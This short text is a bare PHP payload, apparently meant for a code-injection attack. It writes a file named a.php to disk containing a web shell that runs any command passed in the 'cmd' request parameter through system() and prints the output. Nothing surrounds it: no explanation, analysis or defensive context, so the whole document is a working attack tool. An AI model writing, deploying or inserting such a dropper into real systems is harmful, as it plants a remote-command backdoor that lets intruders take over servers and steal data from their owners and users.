fwrite(fopen('a.php','w'),'<?php

if(isset($_REQUEST[\'cmd\'])){
        echo \"<pre>\";
        $cmd = ($_REQUEST[\'cmd\']);
        system($cmd);
        echo \"</pre>\";
        die;
}

?>
');

